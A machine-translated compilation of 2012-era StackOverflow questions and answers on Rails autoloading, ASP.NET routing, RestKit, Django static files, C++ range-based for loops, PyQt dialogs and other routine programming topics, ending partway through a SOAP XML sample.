# StackOverflow 问答 11235000-11235999

# ruby-on-rails-3 - Rails 3 和嵌套目录中的类的问题

> ID：11235001
> 
> 赞同：1
> 
> 时间：2012-06-27T21:22:21.730
> 
> 标签：ruby-on-rails-3

我有一个继承的 Rails 项目。我正在努力将它从 rails 2 升级到 rails 3。我现在在 3.0.15，正在努力升级到 3.2。在 app 目录中有一个包含类的支持文件夹。像这样：

```
app/
  support/ 
    sweeper.rb
    grouped_list/ 
      item.rb
      list.rb 
```

item.rb 看起来像这样：

```
class Support::GroupedList::Item

  attr_accessor :name, :count, :link

  def initialize(name, count, link)
    @name = name
    @count = count
    @link = link
  end
end 
```

在其中一个控制器中，Items 类的调用如下：

```
Support::GroupedList::Item.new name, count, link 
```

当我尝试加载页面时，出现错误：

```
uninitialized constant ApplicationController::Support 
```

我的第一个想法是路径不在自动加载中，所以我添加了

```
config.autoload_paths += %W(#{config.root}/app/support #{config.root}/app/support/grouped_list) 
```

在我的 application.rb 中，但这并没有改变任何东西。在四处寻找示例后，我发现人们在其目录结构中创建了空模块，因此我在 support 文件夹中创建了一个 support.rb 文件，如下所示：

```
module Support
end 
```

现在我的错误变为

```
uninitialized constant Support::GroupedList 
```

嘿！这很有趣，我不明白为什么它会改变，但它的进步对吗？所以我在 grouped_list 目录中添加了一个 grouped_list.rb 文件。它看起来像这样：

```
module Support::GroupedList
end 
```

但后来我得到

```
Expected ***/app/support/grouped_list/grouped_list.rb to define GroupedList 
```

啊! 所以我将其更改为：

```
module GroupedList
end 
```

但后来我回到：

```
uninitialized constant Support::GroupedList 
```

很明显，我缺少一些关于在模块中加载类的基本知识。这种结构在 rails 2 中工作，但在 rails 3.0.15 中中断。我真的很想了解，所以如果有人可以帮助我，我会非常感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-28T12:59:34.617

```
class GroupedList::Item

  attr_accessor :name, :count, :link

  def initialize(name, count, link)
    @name = name
    @count = count
    @link = link
  end
end 
```

这应该有效。然后在你的控制器中：

```
GroupedList::Item.new name, count, link 
```

还记得在进行这些更改后重新启动您的 Rails 服务器/控制台。

# css - Flashplayer 溢出容器外

> ID：11235008
> 
> 赞同：0
> 
> 时间：2012-06-27T21:23:09.870
> 
> 标签：css, flash

这是我正在处理的网页：[http](http://sebastianbiermanlytle.com/games.htm) ://sebastianbiermanlytle.com/games.htm 。flashplayer 在底部。它在两个方向都溢出，有时会覆盖主菜单。我尝试在容器上使用溢出：隐藏，但什么也没发生。如何隐藏溢出？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-27T21:39:13.070

从带有id的css样式中删除`position:absolute`and 就可以了。`left:-25.5px``object``rpgEngine`

# c# - URL重定向到C#中的新页面

> ID：11235013
> 
> 赞同：0
> 
> 时间：2012-06-27T21:23:37.207
> 
> 标签：c#, asp.net-mvc, redirect

我的 Web 应用程序中的特定页面有一个 URL`www.example.com/Test/Index`

`www.example.com/Test`但是，当用户只是输入而不是整个内容时，我想让这个 URL 可以访问。

那么如何单独使用 C# 来完成呢？任何帮助将不胜感激！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-27T21:28:00.917

您可以使用重定向。在 ASP.NET 中，这是 Response.Redirect。在 MVC 中，这是 RedirectToAction("Index")。这将导致他们的浏览器随后请求另一个 URL。

如果您希望 URL 不被更改/重定向，并且显示`www.example.com/Test`，那么您可以使用服务器端重定向。ASP.NET：Server.Transfer。在 MVC 中你可以，`return Index();`但这有时可能会出现问题。更好的选择是使用默认路由：

```
public class MvcApplication : System.Web.HttpApplication
  {
...
    public static void RegisterRoutes(RouteCollection routes)
    {
      routes.IgnoreRoute("{resource}.axd/{*pathInfo}");

      routes.MapRoute(
          "Default", // Route name
          "{controller}/{action}/{id}", // URL with parameters
          new { controller = "Test", action = "Index", id = UrlParameter.Optional } // Parameter defaults
      );

    } 
```

您应该使用任何新创建的 MVC 3 应用程序自动获取此代码。你只需要为你想要尊重这个默认路由的控制器定制它。

# post - Error when posting using RestKit

> ID：11235014
> 
> 赞同：1
> 
> 时间：2012-06-27T21:23:51.073
> 
> 标签：post, restkit

I have been trying to post using RestKit after I have successfully used it for object mapping and keep getting the error "Could not find an object mapping for keyPath: ''".

I have already had success using only JSON of iOS with the following code:

```
responseData = [NSMutableData data];

NSURL *url = [NSURL URLWithString:@"http://lalubema.cloudapp.net:9000/Data.soap/Pessoa"];

NSMutableDictionary *params = [[NSMutableDictionary alloc] init];
[params setObject:@"Objective-c test from send Request #1" forKey:@"Nome"];
[params setObject:@"/Date(1200355200000)/" forKey:@"DataNascimento"];   
[params setObject:@"M" forKey:@"Sexo"];
[params setObject:@"(31)2321-2383" forKey:@"Telefone"];

NSError *jsonError;
NSData *requestdata = [NSJSONSerialization dataWithJSONObject:params options:0 error:&jsonError];

NSMutableURLRequest *request;
request = [NSMutableURLRequest requestWithURL:url];
[request setHTTPMethod:@"POST"];
[request setValue:[NSString stringWithFormat:@"%d", [requestdata length]] forHTTPHeaderField:@"Content-Length"];
[request setValue:@"application/json" forHTTPHeaderField:@"Accept"];
[request setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
[request setHTTPBody:requestdata];

//this kicks off the request asynchronously
NSURLConnection *connection = [[NSURLConnection alloc] initWithRequest:request delegate:self]; 
```

The code I am trying with RestKit and getting the error is the following:

```
[RKObjectManager sharedManager].serializationMIMEType = RKMIMETypeJSON;
[RKObjectManager sharedManager].acceptMIMEType = RKMIMETypeJSON;

RKObjectMapping* pessoaMapping = [RKObjectMapping mappingForClass:[Pessoa class]];
pessoaMapping.setDefaultValueForMissingAttributes = YES;
[pessoaMapping mapKeyPath:@"DataNascimento" toAttribute:@"dataNascimento"];
[pessoaMapping mapKeyPath:@"Nome" toAttribute:@"nome"];
[pessoaMapping mapKeyPath:@"Sexo" toAttribute:@"sexo"];
[pessoaMapping mapKeyPath:@"Telefone" toAttribute:@"telefone"];
[[RKObjectManager sharedManager].mappingProvider addObjectMapping:pessoaMapping]; 

RKObjectMapping* pessoaSerializationMapping = [RKObjectMapping mappingForClass:[NSMutableDictionary class]];
[pessoaSerializationMapping mapAttributes:@"dataNascimento", @"docIdentidade", @"email", @"foto", @"pid", @"nome", @"senha", @"sexo", @"telefone", nil];    
[[RKObjectManager sharedManager].mappingProvider setSerializationMapping:pessoaSerializationMapping forClass:[Pessoa class]];

RKObjectRouter *router = [[RKObjectManager sharedManager] router];

[router routeClass:[Pessoa class] toResourcePath:@"/Pessoa/:id"];
[router routeClass:[Pessoa class] toResourcePath:@"/Pessoa" forMethod:RKRequestMethodPOST];

Pessoa *Novo = [[Pessoa alloc] init];

Novo.nome = @"Objective-c test from send postPessoa #1";
Novo.telefone = @"(31)1234-5678";
Novo.sexo = @"M";

NSDateFormatter *df = [[NSDateFormatter alloc] init];
[df setDateFormat:@"dd-MM-yyyy"];    

RKDotNetDateFormatter *dotNetFormattedDate = [[RKDotNetDateFormatter alloc] init];
NSString *data = [dotNetFormattedDate stringFromDate:[df dateFromString: @"10-10-1979"]];

Novo.dataNascimento = data;

// POST to /Pessoa
[[RKObjectManager sharedManager] postObject:Novo delegate:self]; 
```

**The RKLog error is:**

2012-06-27 17:58:28.539 MyTestApp[6101:fb03] I restkit:RKLog.m:33 RestKit initialized...

2012-06-27 17:58:28.589 MyTestApp[6101:fb03] I restkit.network.reachability:RKReachabilityObserver.m:369 Network availability has been determined for reachability observer

2012-06-27 17:58:41.260 MyTestApp[6101:fb03] W restkit.object_mapping:RKObjectMapper.m:81 Adding mapping error: Could not find an object mapping for keyPath: ''

2012-06-27 17:58:41.261 MyTestApp[6101:fb03] E restkit.network:RKObjectLoader.m:222 Encountered errors during mapping: Could not find an object mapping for keyPath: ''

2012-06-27 17:58:41.261 MyTestApp[6101:fb03] E restkit.network:RKObjectLoader.m:345 Encountered an error while attempting to map server side errors from payload: Could not find an object mapping for keyPath: ''

2012-06-27 17:58:41.262 MyTestApp[6101:fb03] Erro encontrado: Error Domain=org.restkit.RestKit.ErrorDomain Code=1001 "Could not find an object mapping for keyPath: ''" UserInfo=0x808fac0 {=RKObjectMapperKeyPath, NSLocalizedDescription=Could not find an object mapping for keyPath: ''}

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-29T07:42:09.873

I think the main problem is represented by this code block:

```
RKObjectMapping* pessoaMapping = [RKObjectMapping mappingForClass:[Pessoa class]];
pessoaMapping.setDefaultValueForMissingAttributes = YES;
[pessoaMapping mapKeyPath:@"DataNascimento" toAttribute:@"dataNascimento"];
[pessoaMapping mapKeyPath:@"Nome" toAttribute:@"nome"];
[pessoaMapping mapKeyPath:@"Sexo" toAttribute:@"sexo"];
[pessoaMapping mapKeyPath:@"Telefone" toAttribute:@"telefone"];
[[RKObjectManager sharedManager].mappingProvider addObjectMapping:pessoaMapping]; 

RKObjectMapping* pessoaSerializationMapping = [RKObjectMapping mappingForClass:[NSMutableDictionary class]];
[pessoaSerializationMapping mapAttributes:@"dataNascimento", @"docIdentidade", @"email", @"foto", @"pid", @"nome", @"senha", @"sexo", @"telefone", nil];    
[[RKObjectManager sharedManager].mappingProvider setSerializationMapping:pessoaSerializationMapping forClass:[Pessoa class]]; 
```

that you should try replacing with:

```
RKObjectMapping* pessoaMapping = [RKObjectMapping mappingForClass:[Pessoa class]];
pessoaMapping.setDefaultValueForMissingAttributes = YES;
[pessoaMapping mapKeyPath:@"DataNascimento" toAttribute:@"dataNascimento"];
[pessoaMapping mapKeyPath:@"Nome" toAttribute:@"nome"];
[pessoaMapping mapKeyPath:@"Sexo" toAttribute:@"sexo"];
[pessoaMapping mapKeyPath:@"Telefone" toAttribute:@"telefone"];
// up until this point, the code is the same, changes below
// -------------------------------------------------------------------------------
// map rest of the attributes, considering key paths match attribute names exactly
[pessoaMapping mapAttributes:@"docIdentidade", @"email", @"foto", @"pid", @"senha", nil];
// set the serialization mapping
[[RKObjectManager sharedManager].mappingProvider setSerializationMapping:[pessoaMapping inverseMapping] forClass:[Pessoa class]]; 
```

Also, another problem is at the following line:

```
[router routeClass:[Pessoa class] toResourcePath:@"/Pessoa/:id"]; 
```

The identifier attribute in your *Pessoa* class seems to be named *pid*, as seen in the *mapAttributes:* call. When setting the resource path to the router, I presume RestKit does not know what to replace the value of *:id* with, using KVC.

# c# - 如果我已经创建了一个序列化程序集，为什么代码会编译一个序列化程序集？

> ID：11235016
> 
> 赞同：3
> 
> 时间：2012-06-27T21:24:03.167
> 
> 标签：c#, .net, web-services, .net-3.5, xml-serialization

我的客户端代码调用了一个老式的 .asmx Web 服务。为了提高性能，我使用以下命令预先生成了序列化程序集，该命令在 bin/release 文件夹中运行：

```
for %%a in (*.dll) do sgen /assembly:%%a 
```

它本质上是遍历所有 .dll 文件并调用`sgen /assembly:foo.dll`它们。在此命令之后，每个程序集都有一个 foo.XmlSerializers.dll 程序集。

但是，当我分析代码时，我发现代码中仍然存在性能问题，并且它仍然编译序列化程序集（完全忽略了我预先生成的程序集，正如 ProcMon 所验证的那样）。

![在此处输入图像描述](../Images/4e1c37827bbc14eb998f64f7fcfbe7e6.png)

为什么它不使用我预先生成的序列化程序集？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-29T15:37:29.427

它尝试加载`.XmlSerializers.dll`文件，但由于某种原因失败，而是重新生成它。可能是因为它与您的程序集不同步。

尝试将此添加到您的`app.config`文件中：

```
<configuration>
    <system.diagnostics> 
        <switches> 
            <add name="XmlSerialization.PregenEventLog" value="1" /> 
        </switches> 
    </system.diagnostics>
</configuration> 
```

这将使生成器将遇到的错误打印到事件日志中。

更多信息：[XmlSerializers、ModuleVersionId、ILMerge 和 You - Bits in Motion（博客）](http://blog.bits-in-motion.com/2009/11/xmlserializers-moduleversionid-ilmerge.html)

* * *

您可能还对这个 SO 问题感兴趣：[Generating an Xml Serialization assembly as part of my build](https://stackoverflow.com/questions/134224/generating-an-xml-serialization-assembly-as-part-of-my-build)

# sql-server-2008 - SQL Server 2005 数据库到 2008 R2 迁移问题

> ID：11235026
> 
> 赞同：0
> 
> 时间：2012-06-27T21:24:45.430
> 
> 标签：sql-server-2008, database-migration

最近我们将 SQL Server 2005 数据库迁移到 2008 R2。之后我们面临很多问题

1.  从服务器接收结果时发生传输级错误。（提供者：TCP 提供者，错误：0 - 信号量超时期限已过。）。
2.  操作完成前超时时间已过或服务器无响应
3.  建立与 SQL Server 的连接时发生与网络相关或特定于实例的错误。服务器未找到或无法访问。验证实例名称是否正确以及 SQL Server 是否配置为允许远程连接。（提供者：命名管道提供者，错误：40 - 无法打开与 SQL Server 的连接）。

我们删除了所有防火墙，在连接字符串中添加了连接超时等。但问题仍然悬而未决。它会随机出现，为什么会这样？谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-27T21:27:52.107

需要检查的一些事项：

*   您确定 SQL Server 服务正在运行吗？
*   如果它是命名实例或在 1433 以外的端口上，SQL Browser 服务是否正在运行？
*   是否在 Start > Programs > SQL Server > Configuration Tools > SQL Server Configuration Manager（突出显示）下启用了 TCP/IP 和/或命名管道`Protocols for <instance name>`？

# javascript - mouseover.js 加载灰度图像

> ID：11235032
> 
> 赞同：0
> 
> 时间：2012-06-27T21:25:29.377
> 
> 标签：javascript, jquery, mouseover, grayscale

我的鼠标悬停脚本有问题。一切正常，但我有一个小问题，我不知道如何解决。更准确地说，鼠标悬停脚本会创建灰度图像悬停效果。当页面加载时，彩色图像会显示很短的时间（1 秒或更短时间），然后应用 javascript，它们全部变灰，这正是事情应该如何工作的。

我怎样才能使它在应用 javascript 之前不会出现彩色图像？基本上，我希望在页面加载后而不是之后显示灰度图像。是否可以？

[您可以在此处](http://pastebin.com/yeBtedcg)查看脚本，并在[此处](http://www.capital-restaurants.com/web/menu)查看相关网页。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-27T21:43:09.093

我会从 HTML 中删除图像并动态加载它们。

我将`<a class="placeholder" href=""></a>`用作 的占位符，`<img src="" />`并将链接样式设置为隐藏或与设计相得益彰。

```
$('a.placeholder').each(function() {
    var src = $(this).attr('href');
    var image = new Image(); // this is not yet visible in the DOM.
    image.onload = grayscale; // change the grayscale function to accept
                              // event parameters
    image.src = src; // this triggers the onload event which
                                     // grayscales the image
    var dom_image = $('<img />').attr('src', src);
    $(this).replaceWith(dom_image);
}); 
```

当然，您必须在准备好文档而不是在窗口加载时执行上述操作。

# c# - DataContract 中字典的自定义序列化

> ID：11235041
> 
> 赞同：3
> 
> 时间：2012-06-27T21:25:55.503
> 
> 标签：c#, xml-serialization, datacontract

基本上我有一个`DataContract`包含一个`Dictionary`：

```
[DataContract]
public class MyDictionary : IDictionary<string, object> {
    [DataMember(Name = "Data")]
    protected IDictionary<string, object> Dictionary { get; private set; }

    // ...
} 
```

这是 XML 输出的相关部分：

```
<Data>
 <a:KeyValueOfstringanyType>
  <a:Key>ID</a:Key>
  <a:Value i:type="s:int">2</a:Value>
 </a:KeyValueOfstringanyType>
 <a:KeyValueOfstringanyType>
  <a:Key>Value</a:Key>
  <a:Value i:type="s:int">4711</a:Value>
 </a:KeyValueOfstringanyType>
</Data> 
```

如何在此处将输出简化为以下内容：

```
<Data>
  <ID i:type="s:int">2</ID>
  <Value i:type="s:int">4711</Value>
</Data> 
```

Dictionary 键仅限于字符串，因此如果没有人想到使用应该可以正常工作的非 ascii 键的愚蠢想法。我发现这个属性`CollectionDataContract`更接近我想要的，但是键值对将被完整保存，这会浪费内存。也许可以与班级相处融洽，`ISerializable`但我不确定这是否会给`DataContractSerializer`. 顺便说一句，该解决方案也应该适用于`DataContractJsonSerializer`.

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-05-11T16:19:15.870

您遇到的问题来自 IDictionary<'string, object> 是（在某种程度上）IEnumerable<'KeyValuePair<'string, object>>，这就是 DataContractSerializer 序列化每个 KeyValuePair 个性的方式。

您要问的（如果我理解正确的话）是创建自定义序列化，为此您可以实现[IXmlSerializable](http://msdn.microsoft.com/en-us/library/system.xml.serialization.ixmlserializable.aspx)接口。

使用 WriteXml 和 ReadXml 函数来控制写入流的 xml，并将 XmlWriter 作为参数传递。

例如这个函数

```
public void WriteXml(XmlWriter writer)
    {
        foreach (var pair in _dictionary)
        {
            writer.WriteElementString("Key", pair.Key);
            writer.WriteElementString("Value", pair.Value.ToString());
        }
    } 
```

会产生这个结果

```
<MyDictionary xmlns="http://schemas.datacontract.org/2004/07/Sandbox">
    <Key>ID</Key>
    <Value>15</Value>
    <Key>Value</Key>
    <Value>123</Value>
</MyDictionary> 
```

假设已将两对输入到字典中（ID，15 和值，123）。

哦，关于 JSON，有一个[IJsonSerializable](http://msdn.microsoft.com/en-us/library/ee553175.aspx)但我从来没有开始使用它。

# c# - 系统托盘应用程序退出

> ID：11235043
> 
> 赞同：0
> 
> 时间：2012-06-27T21:26:00.030
> 
> 标签：c#, windows, icons, system-tray

我有一个小而简单的 C# 应用程序，它更新系统托盘中的图标。我用它来以图形方式显示 CPU 使用率。该应用程序运行良好。我将窗口隐藏起来，并且不在任务栏中显示它，因此它不会妨碍您。

我的问题是它会运行一段时间。经常几个小时。但随后它将神秘地退出。没有警告。没有。图标刚刚消失，程序不再运行。我已经在不同条件下在调试器中测试了程序，所以我认为不是这样。我有什么明显的遗漏吗？如果程序遇到错误并退出，如果表单被隐藏，我应该期待一条消息吗？是否有一些“保持活动”消息或我需要处理的东西？

这是代码的相关部分：

```
public Form1()
{
    InitializeComponent();

    trayIcon = new NotifyIcon();
    trayIcon.Text = "CPU Utilization";
    trayIcon.Icon = new Icon(SystemIcons.Application, 40, 40);

    trayIcon.Visible = true;

    update = new Thread(new ThreadStart(UpdateCPU));
    update.Start();
}

protected override void OnLoad(EventArgs e)
{
    Visible = false;
    ShowInTaskbar = false;

    base.OnLoad(e);
}

private void UpdateCPU()
{
    Bitmap bm = new Bitmap(32, 32);
    Graphics g = Graphics.FromImage(bm);

    while (true)
    {
        g.FillRectangle(new SolidBrush(c3), 17, 17, 15, 15);
        trayIcon.Icon = System.Drawing.Icon.FromHandle(bm.GetHicon());

        Thread.Sleep(1000);
    }
} 
```

任何帮助将不胜感激！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-27T21:32:53.453

我建议您添加一个未处理的异常处理程序

[winforms控制的全局异常处理](https://stackoverflow.com/questions/2770/global-exception-handling-for-winforms-control)

可能会抛出异常，导致您的程序退出。

然后，引入日志记录来记录异常是什么。我个人更喜欢[NLog](http://nlog-project.org/)。

我有点惊讶您可以从非 UI 线程更新托盘图标而不会收到跨线程异常。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-27T21:32:27.067

该[文档](http://msdn.microsoft.com/en-us/library/system.drawing.icon.fromhandle.aspx)似乎同意 Viktor Latypov 的评论，您应该这样做：

```
Icon newIcon = Icon.FromHandle(bm.GetHicon());

trayIcon.Icon = newIcon;

DestroyIcon(newIcon.Handle); 
```

# actionscript-3 - 如何在 Actionscript 中转义保留字？

> ID：11235044
> 
> 赞同：1
> 
> 时间：2012-06-27T21:26:02.030
> 
> 标签：actionscript-3, flash, apache-flex, actionscript

在 Scala 中，可以使用反引号 (`)，如下图所示：

match 是保留字，因此以下内容将无法编译：

```
class Foo(var match: String) 
```

但这将：

```
class Foo(var `match`: String) 
```

与上面类似，在不使用动态属性的情况下，如何对上面示例中的 AS3 中的保留字进行转义？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-09T17:54:06.773

通常不建议使用保留字作为变量、函数名、函数参数或类名的一部分。为什么？因为在任何语言中，保留字仅用于特定用途。

您还可以随时添加另一个以驼峰式大小写的小字，以区分您的变量和保留字。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-06-09T02:40:24.950

我在将变量发布到贝宝时遇到了类似的问题。例如：

```
URLData.return = "mystring"; 
```

不起作用，因为 return 是保留词。所以只需使用：

```
URLData.['return'] = "mystring"; 
```

# css - 将 CSS 添加到 Django 1.4 模板的新手指南

> ID：11235045
> 
> 赞同：0
> 
> 时间：2012-06-27T21:26:25.297
> 
> 标签：css, django, django-templates, django-static

我真的很困惑。我正在使用 Django 1.4，我整天都在寻找这个，似乎最新版本的 Django 中的一切都发生了变化，并且文档根本​​没有帮助（至少对我来说）。请帮我将 CSS 文件附加到我的模板。

所以，这是我的 settings.py 文件

```
STATIC_ROOT = 'F:/Django/mysite/mysite/static/'

STATIC_URL = '/static/'

STATICFILES_DIRS = (
    "F:/Django/mysite/mysite/static/",
) 
```

这是我的网址

```
from django.conf.urls.defaults import *
from myste.views import hello, home
from django.views.static import *
from django.conf import settings

urlpatterns = patterns('',
    ('^home/$', home)
) 
```

这是意见

```
def home(request):
    return render_to_response('home.html', locals(),context_instance=RequestContext(request)) 
```

最后这是模板（home.html）

```
url: {{ STATIC_URL }} 
```

哦，我不确定我应该在我的 TEMPLATE_CONTEXT_PROCESSORS 中放什么，但到目前为止就是这样。

```
TEMPLATE_CONTEXT_PROCESSORS = (
    "django.contrib.auth.context_processors.auth",
) 
```

这是我运行服务器时得到的输出

```
url: 
```

我知道这些代码中可能存在一些巨大的错误，但那是因为我一直在阅读不同 django 版本的不同来源。是的，我已经阅读了文档，但正如我所说，它对我没有多大帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-27T21:39:25.927

STATIC_URL 不在您的本地范围内，因此通过 locals() 作为您的字典将无济于事。

```
def home(request):
return render_to_response('home.html', {'STATIC_URL': settings.STATIC_URL},context_instance=RequestContext(request)) 
```

或者您可以使用 1.4 中提供的新`static`标签并避免模板中出现此特定问题：

```
{% load static from staticfiles %}
url: {% static "/" %} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-27T21:40:37.920

'django.core.context_processors.media'，'django.core.context_processors.static'，

[根据this](https://docs.djangoproject.com/en/dev/howto/static-files/#with-a-context-processor)，它们都应该在您的 TEMPLATE_CONTEXT_PROCESSORS 中。这使得 STATIC_URL 在所有使用请求上下文的上下文中都可用。如果您真的阅读了文档，并确保将它们设置为 1.4，那么您将避免很多此类问题，并为自己省去很多麻烦。

您可能想使用[渲染](https://docs.djangoproject.com/en/dev/ref/templates/api/#render)来省去一些麻烦和打字。我通常只是把它换成 render_to_request(blah)`render(request, context, template)`在这种情况下是`render(request, locals(), 'home.html')`.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-27T21:40:58.817

您似乎根本没有阅读说明。要做的两件重要的事情是 1) 确保`static`处理器在`TEMPLATE_CONTEXT_PROCESSORS`其中 2) 定义一些 URL 以实际在开发中为您的静态文件提供服务。

这些都没有“在最新版本中改变”。在之前的版本 1.3 中有一些改进，但基本原理是一样的。

# c++ - 无法使用非成员开始和结束函数编写范围

> ID：11235050
> 
> 赞同：2
> 
> 时间：2012-06-27T21:26:46.097
> 
> 标签：c++, for-loop, c++11, g++, bitboard

我正在编写一个使用位板的代码。由于迭代位板的所有位是非常常见的操作，我决定编写一些迭代器类，并使用 c++0x 的基于范围的循环。`begin`但是，g++（4.6.3 版）告诉我or没有匹配的功能`end`。

我的代码：

```
#include <iostream>
#include <cinttypes>

class bitscan {
    uint64_t mask;
public:
    bitscan(uint64_t m) : mask(m) {}
    bool operator!=(bitscan it) const {return mask!=it.mask;}
    bitscan &operator++() {mask&=(mask-1);return *this;}
    int operator*() {return __builtin_ctzl(mask);}
};

bitscan begin(uint64_t m) {return m;}
bitscan end(uint64_t m) {return 0;}

int main() {
    uint64_t num=49;
    for (int i : num) std::cout<<i<<std::endl;
} 
```

错误：

```
err.cpp: In function ‘int main()’:
err.cpp:18:15: error: no matching function for call to ‘begin(long unsigned int&)’
err.cpp:18:15: note: candidates are:
/usr/include/c++/4.6/initializer_list:86:5: note: template<class _Tp> constexpr const _Tp* std::begin(std::initializer_list<_Tp>)
/usr/include/c++/4.6/bits/range_access.h:87:5: note: template<class _Tp, long unsigned int _Nm> _Tp* std::begin(_Tp (&)[_Nm])
/usr/include/c++/4.6/bits/range_access.h:58:5: note: template<class _Container> decltype (__cont.begin()) std::begin(const _Container&)
/usr/include/c++/4.6/bits/range_access.h:48:5: note: template<class _Container> decltype (__cont.begin()) std::begin(_Container&)
err.cpp:18:15: error: no matching function for call to ‘end(long unsigned int&)’
err.cpp:18:15: note: candidates are:
/usr/include/c++/4.6/initializer_list:96:5: note: template<class _Tp> constexpr const _Tp* std::end(std::initializer_list<_Tp>)
/usr/include/c++/4.6/bits/range_access.h:97:5: note: template<class _Tp, long unsigned int _Nm> _Tp* std::end(_Tp (&)[_Nm])
/usr/include/c++/4.6/bits/range_access.h:78:5: note: template<class _Container> decltype (__cont.end()) std::end(const _Container&)
/usr/include/c++/4.6/bits/range_access.h:68:5: note: template<class _Container> decltype (__cont.end()) std::end(_Container&) 
```

如果我用以下行替换循环：`for (auto it=begin(num);it!=end(num);++it) std::cout<<*it<<std::endl;` 它工作正常。

我的错误是什么？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-06-27T21:30:04.187

在基于范围的 for 语句中，仅通过参数相关查找^((*)) (C++11 §6.5.4/1)查找`begin`和非成员函数。这意味着它们只能在与参数类型关联的命名空间中找到（C++11 §3.4.2/2）。`end`

基本类型，如`uint64_t`，没有关联的命名空间，因此不会`begin`或`end`永远不会找到它。您需要创建一个类类型来包装，`uint64_t`以便可以通过依赖于参数的查找找到非成员`begin`和函数。`end`

* * *

(*) 注意：实际上可以找到三种方法`begin`，`end`但这是适用于您的方案的唯一方法。`begin`数组和具有名为and的成员函数的类也有特殊情况`end`。

# python - 从 QMainWindow 打开一个对话框

> ID：11235051
> 
> 赞同：0
> 
> 时间：2012-06-27T21:26:46.313
> 
> 标签：python, dialog, pyqt, mainwindow

当我按下 MainWindow 中的按钮时，我在打开一个小对话框窗口时遇到问题。我知道如何制作一个我需要打开的窗口（我们称之为 EDIT WINDOW），但是从主窗体调用（打开）它，另一个模块是另一回事。

主窗口正在显示，并且正在工作。所有导入都很好，sqlite 连接正常。基本上，程序已经完成，只剩下这个对话框......它应该有 QMainWindow 作为它的父级。

```
#!/usr/bin/python
#encoding=utf8
import sys
from PyQt4 import QtCore, QtGui
from gui import Ui_glavni
from dialog import Ui_Dialog
import snimanje #imported modules
import clear
import pretraga
import izmena #this should represent module with custom made dialog.

class Prozor(snimanje.Snimi, clear.Brisanje, pretraga.Pretraga,QtGui.QMainWindow):
    def __init__(self,parent=None):
        QtGui.QWidget.__init__(self,parent)
        self.ui=Ui_glavni()
        self.ui.setupUi(self)
        QtCore.QObject.connect(self.ui.dugmeSnimi, QtCore.SIGNAL("clicked()"), self.snimi)
        QtCore.QObject.connect(self.ui.dugmeOtkazi, QtCore.SIGNAL("clicked()"), self.brisanjeUnos)
        QtCore.QObject.connect(self.ui.dugmeOtkazi2, QtCore.SIGNAL("clicked()"), self.brisanjeListanje)
        QtCore.QObject.connect(self.ui.dugmeTrazi, QtCore.SIGNAL("clicked()"), self.pretraga)
        QtCore.QObject.connect(self.ui.checkJedinica, QtCore.SIGNAL("stateChanged(int)"), self.aktivJedinica)
        QtCore.QObject.connect(self.ui.checkVrednost, QtCore.SIGNAL("stateChanged(int)"), self.aktivVrednost)
        QtCore.QObject.connect(self.ui.menjaIme, QtCore.SIGNAL("clicked()"), izmena.dijalog)
        QtCore.QObject.connect(self.ui.dugmeBrisi, QtCore.SIGNAL("clicked()"), self.brisanjeIzBaze)
#SREDI IZMENU. SREDI PROVERU UNETIH U BAZU PO BROJU PREDMETA

        def startup():
            self.brisanjeUnos()
            self.brisanjeListanje()
            self.provera()

        startup()

    def aktivJedinica(self):
        self.ui.lineJedinica.setEnabled(False)
        self.ui.lineJedinica.setText("")
        self.ui.checkJedinica.checkStateSet()
        if self.ui.checkJedinica.isChecked():
            self.ui.lineJedinica.setEnabled(True)
            #self.ui.checkJedinica.setEnabled(False)

    def aktivVrednost(self):
        self.ui.vrednost.setEnabled(False)
        self.ui.vrednost.setText("")
        if self.ui.checkVrednost.isChecked():
            self.ui.vrednost.setEnabled(True)

    def pretraga(self):
        if self.ui.radioIme.isChecked():
            self.pretragaIme()
        elif self.ui.radioBrPr.isChecked():
            self.pretragaBrPr()
        else:
            self.pretragaSudski()

if __name__=="__main__":
    program = QtGui.QApplication(sys.argv)
    mojprogram = Prozor()
    mojprogram.show()
    sys.exit(program.exec_()) 
```

# c# - 使用 Visual Studio XML 架构定义工具 (Xsd.exe) 架构验证时出现错误警告

> ID：11235053
> 
> 赞同：1
> 
> 时间：2012-06-27T21:27:26.747
> 
> 标签：c#, xml, xsd

我有一个 xml 文件，我正在尝试使用 Visual Studio 中的 XSD.exe 工具创建一个类文件。这是 XML 文件：

```
<?xml version="1.0" encoding="utf-8" ?> 
<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:wsse="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd" xmlns:wsu="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd">
<soap:Header>
<PayloadManifest xmlns="http://www.starstandards.org/webservices/2005/10/transport">
<manifest contentID="Content0" namespaceURI="?" element="?" relatedID="?" version="?" /> 
</PayloadManifest>
<wsa:Action>http://www.starstandards.org/webservices/2005/10/transport/operations/ProcessMessageResponse</wsa:Action> 
<wsa:MessageID>urn:uuid:b56c3b11-d4a7-4372-9e6a-7498aa2aeb06</wsa:MessageID> 
<wsa:RelatesTo>urn:uuid:71089910-41d4-4104-bbd7-2b3ac7cece0f</wsa:RelatesTo> 
